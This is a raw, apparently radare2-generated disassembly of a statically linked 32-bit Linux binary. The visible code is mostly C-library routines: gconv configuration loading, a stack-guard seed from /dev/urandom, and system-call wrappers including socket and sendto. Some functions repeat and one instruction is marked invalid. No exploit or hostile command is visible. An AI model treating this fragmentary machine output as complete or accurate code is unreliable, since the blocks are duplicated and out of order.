mov dword [esp], 0x80aa868
call section.
mov eax, dword [0x80aacac]
test eax, eax
je 0x8057974
mov eax, 0
test eax, eax
je 0x805796c
mov dword [esp], 0x80aa868
call section.
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [0x80aaca4]
test ebx, ebx
jne 0x8057bce
mov dword [esp], str._usr_lib_gconv
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_8h], edx
mov dword [var_4h], str._usr_lib_gconv
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov dword [var_1ch], 0
mov dword [var_10h], eax
mov dword [var_14h], 0xf
mov dword [var_18h], 0
mov eax, dword [var_10h]
mov dword [var_4h], 0x3a
xor esi, esi
mov ebx, 1
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ecx, eax
je 0x8057a16
lea esi, [esi]
lea eax, [esi + 1]
lea edx, [ebx + 1]
mov dword [var_4h], 0x3a
cmp ecx, eax
mov esi, ecx
lea eax, [ecx + 1]
mov dword [esp], eax
cmovne ebx, edx
call fcn.08076ce0
test eax, eax
mov ecx, eax
jne 0x80579f0
mov edx, dword [var_14h]
mov ecx, dword [var_1ch]
lea edi, [ebx*8]
inc ecx
lea eax, [edx + edi]
lea edx, [ebx - 1]
imul edx, ecx
add eax, ebx
lea eax, [edx + eax + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8057b5c
mov edx, dword [var_10h]
lea ecx, [edi + eax + 8]
mov dword [0x80aaca8], 0
xor edi, edi
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057bc1
xor ebx, ebx
test al, al
je 0x8057a88
mov eax, edx
inc edx
mov ebx, eax
movzx eax, byte [edx]
test al, al
je 0x8057a85
inc edx
cmp al, 0x3a
je 0x8057bb8
movzx eax, byte [edx]
test al, al
jne 0x8057a75
mov dword [var_10h], edx
test ebx, ebx
je 0x8057b97
mov dword [esi + edi*8], ecx
cmp byte [ebx], 0x2f
je 0x8057abf
mov eax, dword [var_18h]
test eax, eax
je 0x8057b73
mov eax, dword [var_1ch]
mov edx, dword [var_18h]
mov dword [esp], ecx
mov dword [var_8h], eax
mov dword [var_4h], edx
call fcn.08053740
mov ecx, eax
mov byte [eax], 0x2f
inc ecx
mov dword [esp], ecx
mov dword [var_4h], ebx
call fcn.080773c0
cmp byte [eax - 1], 0x2f
mov ecx, eax
je 0x8057ad7
mov byte [eax], 0x2f
inc ecx
mov edx, ecx
mov eax, dword [0x80aaca8]
sub edx, dword [esi + edi*8]
cmp edx, eax
mov dword [esi + edi*8 + 4], edx
cmova eax, edx
inc edi
mov dword [0x80aaca8], eax
mov byte [ecx], 0
mov edx, dword [var_10h]
inc ecx
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057b69
xor ebx, ebx
test al, al
je 0x8057b1f
mov eax, edx
inc edx
mov ebx, eax
movzx eax, byte [edx]
test al, al
je 0x8057b1c
inc edx
cmp al, 0x3a
je 0x8057b63
movzx eax, byte [edx]
test al, al
jne 0x8057b10
mov dword [var_10h], edx
test ebx, ebx
jne 0x8057a90
test esi, esi
mov dword [esi + edi*8], 0
mov dword [esi + edi*8 + 4], 0
mov eax, esi
je 0x8057b5c
mov edi, dword [var_18h]
mov dword [0x80aacac], eax
test edi, edi
je 0x8057957
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08051180
jmp 0x8057957
mov eax, 0x80aa880
jmp 0x8057b3c
mov byte [edx - 1], 0
jmp 0x8057b1c
inc edx
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057b69
jmp 0x8057afe
mov dword [var_sp_ch], str.__gconv_get_path
mov dword [var_8h], 0x1f6
mov dword [var_4h], str.gconv_conf.c
mov dword [esp], str.cwd_____void__0_
call fcn.0805efc0
mov dword [var_sp_ch], str.__gconv_get_path
mov dword [var_8h], 0x1f0
mov dword [var_4h], str.gconv_conf.c
mov dword [esp], str.elem_____void__0_
jmp 0x8057b92
mov byte [edx - 1], 0
jmp 0x8057a85
inc edx
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057bc1
jmp 0x8057a63
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x10]
mov dword [var_14h], edx
lea edx, [eax + 0x22]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1fh]
mov dword [var_8h], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_10h], edx
mov dword [esp], edx
call fcn.08053740
mov byte [eax], 0x3a
mov dword [var_4h], str._usr_lib_gconv
mov dword [var_8h], 0xf
inc eax
mov dword [esp], eax
call fcn.08053740
mov dword [esp], 0
mov dword [var_4h], 0
call fcn.08079700
mov dword [var_18h], eax
mov dword [esp], eax
call fcn.08053400
mov dword [var_1ch], eax
jmp 0x80579cc
jmp fcn.08057c50
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov dword [var_10h], 0
mov dword [var_14h], 0
call fcn.08048b20
mov ebx, eax
mov eax, dword [eax]
mov dword [var_20h], eax
call fcn.0805c990
test eax, eax
jne 0x8057c89
mov edx, dword [var_20h]
mov dword [ebx], edx
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80aacac]
test eax, eax
je 0x8057da8
mov edx, dword [eax]
xor edi, edi
test edx, edx
je 0x8057d0b
mov dword [var_24h], edx
mov esi, dword [eax + edi*8 + 4]
inc edi
lea eax, [esi + 0x20]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_24h]
lea ebx, [var_1bh]
mov dword [var_8h], esi
and ebx, 0xfffffff0
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.08053740
mov dword [esp], eax
mov dword [var_8h], 0xe
mov dword [var_4h], str.gconv_modules
call fcn.08053740
mov ecx, esi
lea eax, [var_14h]
lea edx, [var_10h]
mov dword [esp], eax
mov eax, ebx
mov dword [var_4h], edx
mov edx, dword [var_24h]
call fcn.08057780
mov eax, dword [0x80aacac]
sub esp, 8
mov edx, dword [eax + edi*8]
test edx, edx
mov dword [var_24h], edx
jne 0x8057ca1
xor edi, edi
lea esi, [var_1ch]
mov ebx, edi
mov dword [var_8h], fcn.08056520
mov dword [var_4h], 0x80aaca0
shl ebx, 5
mov dword [esp], esi
mov eax, dword [ebx + str.36_t_bp5_t_b]
mov dword [var_1ch], eax
call fcn.0807a2c0
test eax, eax
je 0x8057d99
inc edi
cmp edi, 0xb
jbe 0x8057d10
mov edi, 0x24
dec edi
mov ebx, dword [edi*4 + 0x80a9780]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
mov dword [var_8h], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov edx, dword [var_14h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08057210
test edi, edi
jne 0x8057d45
call fcn.08048b20
mov edx, dword [var_20h]
mov dword [eax], edx
jmp 0x8057c81
lea eax, [ebx + str.36_t_bp5_t_b]
xor edx, edx
call fcn.08057370
jmp 0x8057d3a
call fcn.08057930
mov eax, dword [0x80aacac]
jmp 0x8057c96
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
xor esi, esi
push ebx
xor ebx, ebx
sub esp, 0x14
mov dword [var_10h], edx
mov eax, dword [ebx + 0x80a9820]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x8057df3
inc esi
add ebx, 0x1c
cmp esi, 0xb
jbe 0x8057dd2
jmp 0x8057e67
cmp esi, 0xb
ja 0x8057e67
lea edx, [esi*8]
mov ecx, dword [var_10h_2]
sub edx, esi
shl edx, 2
mov eax, dword [edx + 0x80a9824]
mov dword [ecx + 0x1c], 0
mov dword [ecx + 0x20], 0
mov dword [ecx], 0
mov dword [ecx + 4], 0
mov dword [ecx + 0x14], eax
mov eax, dword [edx + 0x80a9828]
mov dword [ecx + 0x18], eax
mov eax, dword [edx + 0x80a982c]
mov dword [ecx + 0x24], eax
mov eax, dword [edx + 0x80a9830]
mov dword [ecx + 0x28], eax
mov eax, dword [edx + 0x80a9834]
mov dword [ecx + 0x2c], eax
mov eax, dword [edx + 0x80a9838]
mov dword [ecx + 0x34], 0
mov dword [ecx + 0x30], eax
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], str.__gconv_get_builtin_trans
mov dword [var_8h], 0x47
mov dword [var_4h], str.gconv_builtin.c
mov dword [esp], str.cnt___sizeof__map____sizeof__map_0__
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0xffffffff
mov ebp, esp
movzx edx, byte [var_8h]
leave
movzx ecx, dl
test dl, dl
cmovns eax, ecx
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x48
mov ecx, dword [arg_ch]
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov ebx, dword [arg_20h]
add edx, 0x24
add eax, 0x3c
mov dword [var_1ch], edx
test byte [ecx + 8], 1
mov dword [var_18h], eax
jne 0x80582c4
mov esi, dword [eax + 0x14]
mov dword [var_20h], esi
test ebx, ebx
jne 0x805823d
mov esi, dword [arg_10h]
mov eax, dword [arg_18h]
mov ecx, dword [esi]
test eax, eax
mov dword [var_24h], ecx
jne 0x8058233
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_10h], eax
mov edi, dword [arg_24h]
mov eax, dword [arg_ch]
mov eax, dword [eax + 4]
test edi, edi
mov dword [var_28h], eax
je 0x8057fd6
mov edx, dword [arg_ch]
mov ebx, dword [edx + 0x14]
mov esi, dword [ebx]
mov eax, esi
mov dword [var_34h], esi
and eax, 7
je 0x8057fd6
mov esi, dword [arg_18h]
test esi, esi
jne 0x805820f
mov edx, eax
lea edi, [var_10h]
mov eax, dword [arg_14h]
cmp dword [var_24h], eax
jae 0x80581f0
cmp edx, 3
ja 0x8057f9e
mov eax, dword [arg_10h]
lea esi, [ecx + 1]
mov dword [eax], esi
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov esi, dword [arg_10h]
inc edx
mov ecx, dword [esi]
cmp ecx, dword [arg_14h]
jae 0x80581f0
cmp edx, 3
jbe 0x8057f7b
movzx eax, byte [ebx + 7]
mov edx, dword [edi]
mov byte [edx], al
movzx eax, byte [ebx + 6]
mov edx, dword [edi]
mov byte [edx + 1], al
movzx eax, byte [ebx + 5]
mov edx, dword [edi]
mov byte [edx + 2], al
movzx eax, byte [ebx + 4]
mov edx, dword [edi]
mov byte [edx + 3], al
xor eax, eax
and dword [ebx], 0xfffffff8
add dword [edi], 4
test eax, eax
jne 0x8058109
mov esi, dword [arg_10h]
mov ecx, dword [esi]
mov eax, dword [var_10h]
mov edx, dword [var_28h]
mov dword [var_24h], ecx
mov ebx, ecx
mov dword [var_2ch], eax
sub edx, dword [var_2ch]
mov eax, dword [arg_14h]
sub eax, ecx
mov ecx, dword [var_2ch]
cmp edx, eax
cmovg edx, eax
cmp edx, 0xffffffff
lea eax, [edx + 3]
mov edi, edx
cmovle edi, eax
xor esi, esi
sar edi, 2
cmp esi, edi
jae 0x8058024
inc esi
mov eax, dword [ebx]
mov edx, ecx
ror ax, 8
ror eax, 0x10
ror ax, 8
add ebx, 4
add ecx, 4
cmp esi, edi
mov dword [edx], eax
jb 0x8058008
mov edx, dword [arg_10h]
mov esi, 4
mov dword [edx], ebx
cmp ebx, dword [arg_14h]
mov dword [var_10h], ecx
je 0x8058046
lea eax, [ecx + 4]
cmp eax, dword [var_28h]
setbe al
movzx esi, al
lea esi, [esi + esi + 5]
mov edi, esi
mov edx, dword [arg_18h]
test edx, edx
jne 0x80581e5
mov ecx, dword [arg_ch]
mov ebx, dword [ecx + 0x20]
test ebx, ebx
je 0x8058072
lea esi, [esi]
mov eax, dword [ebx + 4]
test eax, eax
jne 0x80581b1
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8058060
mov eax, dword [arg_ch]
inc dword [eax + 0xc]
test byte [eax + 8], 1
jne 0x80581a4
mov edx, dword [var_2ch]
cmp dword [var_10h], edx
jbe 0x80580ef
mov eax, dword [eax]
mov dword [var_14h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_10h]
mov edx, dword [arg_24h]
mov dword [var_sp_18h], 0
mov ecx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], eax
mov dword [var_sp_1ch], edx
lea eax, [var_14h]
mov dword [var_8h], eax
mov edx, dword [var_18h]
mov dword [var_sp_14h], ecx
mov eax, dword [var_1ch]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_20h]
cmp eax, 4
je 0x805818c
mov ecx, dword [var_14h]
mov edx, dword [var_10h]
cmp ecx, edx
jne 0x8058180
mov edi, eax
test edi, edi
jne 0x8058100
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_10h], eax
jmp 0x8057fd1
mov eax, dword [arg_24h]
test eax, eax
jne 0x8058111
mov eax, edi
add esp, 0x48
pop ebx
pop esi
pop edi
leave
ret
cmp edi, 7
jne 0x8058107
mov eax, dword [arg_10h]
mov ecx, dword [eax]
mov eax, dword [arg_14h]
sub eax, ecx
cmp eax, 3
jg 0x805815c
xor ebx, ebx
cmp ecx, dword [arg_14h]
jae 0x805814b
mov esi, dword [arg_ch]
lea eax, [ecx + 1]
mov edx, dword [esi + 0x14]
mov esi, dword [arg_10h]
mov dword [esi], eax
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov eax, dword [esi]
inc ebx
cmp eax, dword [arg_14h]
mov ecx, eax
jb 0x805812c
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ebx
invalid
push ebp
mov ebp, esp
sub esp, 0x28
mov eax, dword [0x80aa0f4]
mov dword [var_8h], ebx
mov dword [var_4h], esi
test eax, eax
je 0x8048b9d
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [var_sp_4h], 0
mov dword [esp], str._dev_urandom
call fcn.08053ec0
cmp eax, 0xffffffff
mov esi, eax
je 0x8048bdf
mov dword [var_sp_8h], 4
mov dword [var_sp_4h], 0x80aa0f4
mov dword [esp], eax
call fcn.08053f70
mov dword [esp], esi
mov ebx, eax
call fcn.08053f20
cmp ebx, 4
je 0x8048b95
lea eax, [var_10h]
mov dword [0x80aa0f4], 0xff0a0d00
mov dword [var_sp_4h], 0
mov dword [esp], eax
call fcn.08053d70
mov eax, dword [var_10h]
xor eax, dword [var_ch]
xor dword [0x80aa0f4], eax
jmp 0x8048b95
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], 0x20000
mov dword [esp], 0
call fcn.08048610
mov dword [var_4h], 0x20002
mov dword [esp], 1
call fcn.08048610
mov dword [var_4h], 0x20002
mov dword [esp], 2
call fcn.08048610
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x7c
mov esi, dword [arg_8h]
mov dword [var_4h], 1
mov dword [esp], esi
call fcn.08054250
inc eax
je 0x8048637
add esp, 0x7c
pop ebx
pop esi
pop edi
leave
ret
call fcn.08048b20
cmp dword [eax], 9
mov edi, eax
jne 0x804862f
mov ebx, str._dev_null
xor edx, edx
mov ecx, dword [arg_ch]
mov eax, 5
int 0x80
cmp eax, 0xfffff000
ja 0x80486a3
cmp eax, esi
jne 0x80486a0
lea eax, [var_78h]
mov dword [var_4h], esi
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
jne 0x80486a0
mov eax, dword [var_68h]
and eax, 0xf000
cmp eax, 0x2000
jne 0x80486a0
mov eax, dword [var_58h]
mov edx, dword [var_54h]
xor eax, 0x103
mov ecx, edx
or ecx, eax
je 0x804862f
lea esi, [esi]
hlt
jmp 0x80486a0
neg eax
mov dword [edi], eax
mov eax, 0xffffffff
jmp 0x804865b
push ebp
mov ebp, esp
sub esp, 0x1c
mov ecx, dword [0x80aa844]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov ebx, dword [arg_10h]
test ecx, ecx
mov edi, dword [arg_ch]
jne 0x805428d
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], edi
mov dword [esp], esi
call fcn.08054040
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
cmp edi, 7
je 0x8054297
cmp edi, 0xe
jne 0x8054272
call fcn.08054950
mov dword [esp], esi
mov dword [var_sp_4h], edi
mov dword [var_sp_8h], ebx
mov dword [var_10h], eax
call fcn.08054040
mov ebx, eax
mov eax, dword [var_10h]
call fcn.080549a0
mov eax, ebx
jmp 0x8054282
push ebp
mov ebp, esp
sub esp, 0x5c
mov eax, dword [0x80aad2c]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
test eax, eax
jne 0x8053e44
call fcn.08048b20
mov ecx, esi
mov dword [var_50h], eax
mov edi, dword [eax]
mov eax, 0xc5
int 0x80
cmp eax, 0xfffff000
ja 0x8053e86
cmp eax, 0xffffffff
mov edx, eax
je 0x8053e2d
test edx, edx
jne 0x8053e20
mov eax, dword [esi + 0x58]
cmp dword [esi + 0xc], eax
je 0x8053e20
mov eax, dword [esi + 0xc]
mov dword [esi + 0x5c], 0
mov dword [esi + 0x58], eax
lea esi, [esi]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_50h]
cmp dword [ecx], 0x26
jne 0x8053e03
mov edx, dword [var_50h]
mov dword [edx], edi
mov dword [0x80aad2c], 1
lea edi, [var_4ch]
mov ecx, edi
mov eax, 0x6c
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8053e76
test ebx, ebx
mov edx, ebx
jne 0x8053e20
mov eax, dword [arg_8h]
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], edi
mov dword [esp], eax
call fcn.08054430
mov edx, eax
jmp 0x8053e20
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8053e59
mov edx, dword [var_50h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x8053dfc
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [0x80aa9dc]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x8054662
mov eax, dword [0x80a95f8]
test eax, eax
je 0x805467d
mov dword [esp], 0
call fcn.08079fe0
mov edx, 0xffffffff
test eax, eax
js 0x8054683
mov ebx, dword [0x80aa9dc]
test esi, esi
mov edx, ebx
jne 0x805468d
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
lea eax, [esi + ebx]
mov dword [esp], eax
call fcn.08079fe0
mov edx, 0xffffffff
test eax, eax
cmovns edx, ebx
jmp 0x8054683
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08053400
test eax, eax
mov edx, eax
je 0x804b505
mov edi, 2
nop
mov ebx, edi
mov ecx, esi
mov eax, 4
int 0x80
cmp eax, 0xfffff000
ja 0x804b500
add esi, eax
sub edx, eax
test edx, edx
jne 0x804b4e0
jmp 0x804b505
lea esi, [esi]
cmp eax, 0xfffffffc
je 0x804b4f6
mov dword [esp], 0x7f
call fcn.08053d90
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
call fcn.08048164
call fcn.080481f0
call fcn.08091a20
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.0804816d
push ebp
mov eax, 0
mov ebp, esp
call fcn.080481fd
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, section..ctors
mov eax, dword [section..ctors]
cmp eax, 0xffffffff
je 0x8091a4c
lea esi, [esi]
lea edi, [edi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x8091a40
pop eax
pop ebx
pop ebp
ret
cmp dword [0x80aa844], 0
jne 0x8053eea
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 5
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
push eax
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 5
int 0x80
pop ebx
xchg dword [esp], eax
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
cmp dword [0x80aa844], 0
jne 0x8053f9a
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 3
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
push eax
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 3
int 0x80
pop ebx
xchg dword [esp], eax
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0x4e
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_8h]
test eax, eax
je 0x8049269
mov dword [var_8h], 0x80
mov dword [var_4h], 0xff
mov dword [esp], eax
call fcn.080536f0
xor eax, eax
leave
ret
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x8049267
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, dword [arg_ch]
test ebx, ebx
je 0x8049297
test eax, eax
jle 0x8049297
cmp eax, 0x40
jle 0x80492ac
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [esp]
leave
ret
dec eax
mov edx, 0xfffffffe
mov ecx, eax
shr eax, 5
and ecx, 0x1f
rol edx, cl
and dword [ebx + eax*4], edx
xor eax, eax
jmp 0x80492a7
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [0x80aabec]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
test eax, eax
jne 0x80491e4
call fcn.08048b20
mov esi, 8
mov edx, dword [arg_10h]
mov dword [var_10h], eax
mov edi, dword [eax]
mov ecx, dword [arg_ch]
mov eax, 0xaf
int 0x80
cmp eax, 0xfffff000
ja 0x804920e
test eax, eax
js 0x80491cd
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_10h]
cmp dword [ecx], 0x26
jne 0x80491c2
mov eax, dword [var_10h]
mov dword [eax], edi
mov dword [0x80aabec], 1
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, 0x7e
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x80491fe
mov eax, esi
jmp 0x80491c2
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x80491fa
mov edx, dword [var_10h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x80491be
push ebp
mov ebp, esp
push edi
mov edx, dword [arg_8h]
push esi
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_10h]
mov edi, edx
movzx eax, byte [edx]
inc edx
test al, al
jne 0x80534c1
sub edx, 2
cmp ebx, 3
jbe 0x8053508
mov esi, ebx
shr esi, 2
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
dec esi
jne 0x80534d6
and ebx, 3
test ebx, ebx
je 0x805351e
lea esi, [esi]
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
dec ebx
jne 0x8053510
test al, al
je 0x8053526
mov byte [edx + 1], 0
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
cmp dword [0x80aa844], 0
jne 0x8053ffa
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 4
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
push eax
push ebx
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 4
int 0x80
pop ebx
xchg dword [esp], eax
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
mov edx, ebx
mov eax, 0x66
mov ebx, 1
lea ecx, [arg_4h]
int 0x80
mov ebx, edx
cmp eax, 0xffffff83
jae fcn.080564b0
ret
cmp dword [0x80aa844], 0
jne 0x80548f7
mov edx, ebx
mov eax, 0x66
mov ebx, 0xb
lea ecx, [arg_8h]
int 0x80
mov ebx, edx
cmp eax, 0xffffff83
jae fcn.080564b0
ret
push esi
call fcn.08054950
mov esi, eax
mov edx, ebx
mov eax, 0x66
mov ebx, 0xb
lea ecx, [arg_8h]
int 0x80
mov ebx, edx
xchg esi, eax
call fcn.080549a0
mov eax, esi
pop esi
cmp eax, 0xffffff83
jae fcn.080564b0
ret
push ebp
mov eax, 0
mov ebp, esp
test eax, eax
push ebx
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
je 0x804915f
mov ebx, dword [esp]
leave
jmp section.
mov dword [arg_10h], edx
mov dword [arg_ch], ecx
mov dword [arg_8h], ebx
mov ebx, dword [esp]
leave
jmp 0x8048f40
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [0x80aabec]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
test eax, eax
jne 0x80491e4
call fcn.08048b20
mov esi, 8
mov edx, dword [arg_10h]
mov dword [var_10h], eax
mov edi, dword [eax]
mov ecx, dword [arg_ch]
mov eax, 0xaf
int 0x80
cmp eax, 0xfffff000
ja 0x804920e
test eax, eax
js 0x80491cd
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_10h]
cmp dword [ecx], 0x26
jne 0x80491c2
mov eax, dword [var_10h]
mov dword [eax], edi
mov dword [0x80aabec], 1
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, 0x7e
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x80491fe
mov eax, esi
jmp 0x80491c2
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x80491fa
mov edx, dword [var_10h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x80491be
nop
nop
nop
nop
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0x25
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_8h]
test eax, eax
je 0x8049269
mov dword [var_8h], 0x80
mov dword [var_4h], 0xff
mov dword [esp], eax
call fcn.080536f0
xor eax, eax
leave
ret
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x8049267
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, dword [arg_ch]
test ebx, ebx
je 0x8049297
test eax, eax
jle 0x8049297
cmp eax, 0x40
jle 0x80492ac
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [esp]
leave
ret
dec eax
mov edx, 0xfffffffe
mov ecx, eax
shr eax, 5
and ecx, 0x1f
rol edx, cl
and dword [ebx + eax*4], edx
xor eax, eax
jmp 0x80492a7
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_8h]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.080494c0
leave
ret
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x10
mov edx, dword [0x80a9054]
mov esi, dword [arg_8h]
test edx, edx
je 0x804937a
mov eax, dword [edx + 4]
test eax, eax
je 0x804935a
lea esi, [esi]
dec eax
mov dword [edx + 4], eax
shl eax, 4
lea eax, [eax + edx]
lea ecx, [eax + 8]
mov eax, dword [eax + 8]
